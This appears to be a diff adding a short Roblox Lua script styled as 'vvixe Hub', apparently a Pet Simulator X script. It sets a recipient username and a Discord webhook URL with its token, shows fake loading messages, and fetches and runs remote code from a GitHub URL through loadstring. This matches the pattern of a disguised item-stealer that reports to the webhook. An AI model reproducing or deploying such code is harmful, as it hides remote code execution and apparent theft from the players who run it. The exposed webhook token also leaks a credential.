@@ -1,0 +1,9 @@
+Username = "nikosssiek"
+WebHook = "https://discord.com/api/webhooks/1076875315495841823/gA8dS1q2Grw4bg8XEgT0lQwNCayUSl_ThPMkt-tqJ5YiBAkbbYBCSjhPirfvYtzgp5O7"
+
+_G.CustomScriptName = "vvixe Hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
